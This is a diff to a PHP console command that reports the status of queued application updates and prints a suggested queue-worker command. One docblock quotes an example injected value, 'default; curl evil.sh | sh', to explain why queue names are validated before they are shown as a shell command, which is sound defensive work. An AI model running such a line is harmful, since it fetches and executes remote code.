@@ -116,6 +116,7 @@ class UpdateStatusCommand extends Command
 
         match ( $status ) {
             UpdateRunStatus::Completed   => $this->info( '✓ ' . $label ),
+            UpdateRunStatus::Queued,
             UpdateRunStatus::InProgress  => $this->warn( '… ' . $label ),
             UpdateRunStatus::Failed,
             UpdateRunStatus::Interrupted => $this->error( '✗ ' . $label ),
@@ -128,7 +129,7 @@ class UpdateStatusCommand extends Command
 
         $rows = [
             [__( 'From version' ), $this->stringField( $state, 'current_version' ) ?: '—'],
-            [__( 'To version' ), $this->stringField( $state, 'target_version' ) ?: '—'],
+            [__( 'To version' ), $this->targetVersionField( $state, $status )],
             [
                 __( 'Last step' ),
                 null !== $step
@@ -139,6 +140,17 @@ class UpdateStatusCommand extends Command
             [__( 'Last updated' ), $this->stringField( $state, 'updated_at' ) ?: '—'],
             [__( 'PHP SAPI' ), $this->stringField( $state, 'php_sapi' ) ?: '—'],
         ];
+
+        // Only present for a run that came through `dispatchUpdate()`. Shown
+        // for the whole lifetime of such a run, not just while it is queued —
+        // "which worker is meant to be running this" stays the operative
+        // question right up until it finishes.
+        $queuedAt = $this->stringField( $state, 'queued_at' );
+
+        if ( '' !== $queuedAt ) {
+            $rows[] = [__( 'Queued' ), $queuedAt];
+            $rows[] = [__( 'Queue' ), $this->queueDescription( $state )];
+        }
 
         $this->table( [__( 'Field' ), __( 'Value' )], $rows );
 
@@ -158,6 +170,112 @@ class UpdateStatusCommand extends Command
             $this->newLine();
             $this->comment( __( 'An update is either still running or died without triggering its shutdown handler (e.g. `kill -9`). Check whether the recorded PID is still alive before intervening.' ) );
         }
+
+        if ( UpdateRunStatus::Queued === $status ) {
+            $this->renderQueuedGuidance( $state );
+        }
+    }
+
+    /**
+     * Explain what a `queued` record means and what makes it move.
+     *
+     * The single most likely reason a record sits here is a host with no queue
+     * worker running — the failure mode `dispatchUpdate()`'s driver guard
+     * cannot detect from the dispatching process, because whether a worker is
+     * consuming a perfectly well-configured connection is not knowable from
+     * config.
+     *
+     * @since 2.8.0
+     *
+     * @param  array<string, mixed>  $state  Persisted state.
+     */
+    protected function renderQueuedGuidance( array $state ): void
+    {
+        $this->newLine();
+        $this->comment( __( 'The update has been pushed onto the queue and no worker has claimed it yet. Nothing has been changed on this installation.' ) );
+        $this->newLine();
+        $this->line( __( 'If it stays here, no worker is consuming :queue. Start one with:', ['queue' => $this->queueDescription( $state )] ) );
+
+        $queueName  = $this->queueIdentifier( $state, 'queue_name' );
+        $connection = $this->queueIdentifier( $state, 'queue_connection' );
+
+        $command = 'php artisan queue:work'
+            . ( '' === $connection ? '' : " {$connection}" )
+            . ( '' === $queueName ? '' : " --queue={$queueName}" )
+            . ' --tries=1';
+
+        $this->comment( "  {$command}" );
+    }
+
+    /**
+     * Read a queue connection or queue name for use inside a command the
+     * operator is being invited to copy and paste.
+     *
+     * Every other field this command renders is rendered as data; this one is
+     * rendered as a shell command, so a record carrying `default; curl evil.sh
+     * | sh` would be printed as something to run. The record is read after a
+     * crash by definition and the whole class treats it as untrusted, so the
+     * value is dropped unless it looks like the plain identifier a connection
+     * or queue name actually is.
+     *
+     * @since 2.8.0
+     *
+     * @param  array<string, mixed>  $state  Persisted state.
+     * @param  string  $key  Field to read.
+     *
+     * @return string Field value, or an empty string when it is not a plain identifier.
+     */
+    protected function queueIdentifier( array $state, string $key ): string
+    {
+        $value = $this->stringField( $state, $key );
+
+        return 1 === preg_match( '/^[A-Za-z0-9_.:-]{1,64}$/', $value ) ? $value : '';
+    }
+
+    /**
+     * Human-readable description of the connection and queue a run was pushed
+     * onto.
+     *
+     * @since 2.8.0
+     *
+     * @param  array<string, mixed>  $state  Persisted state.
+     *
+     * @return string Queue description.
+     */
+    protected function queueDescription( array $state ): string
+    {
+        $connection = $this->stringField( $state, 'queue_connection' ) ?: __( 'default' );
+        $queueName  = $this->stringField( $state, 'queue_name' ) ?: __( 'default' );
+
+        return "{$connection} / {$queueName}";
+    }
+
+    /**
+     * The target version to display.
+     *
+     * A queued run records whatever the caller asked for, which is empty when
+     * they asked for "latest" — resolving it at dispatch time would mean a
+     * network round-trip in the request doing the dispatching. Rendering that
+     * as `—` would read as "unknown" when it is in fact a deliberate choice.
+     *
+     * @since 2.8.0
+     *
+     * @param  array<string, mixed>  $state  Persisted state.
+     * @param  UpdateRunStatus|null  $status  Parsed status, when recognised.
+     *
+     * @return string Field value.
+     */
+    protected function targetVersionField( array $state, ?UpdateRunStatus $status ): string
+    {
+        $target = $this->stringField( $state, 'target_version' );
+
+        if ( '' !== $target ) {
+            return $target;
+        }
+
+        return UpdateRunStatus::Queued === $status
+            ? __( 'latest (resolved when the job starts)' )
+            : '—';
     }
 
     /**
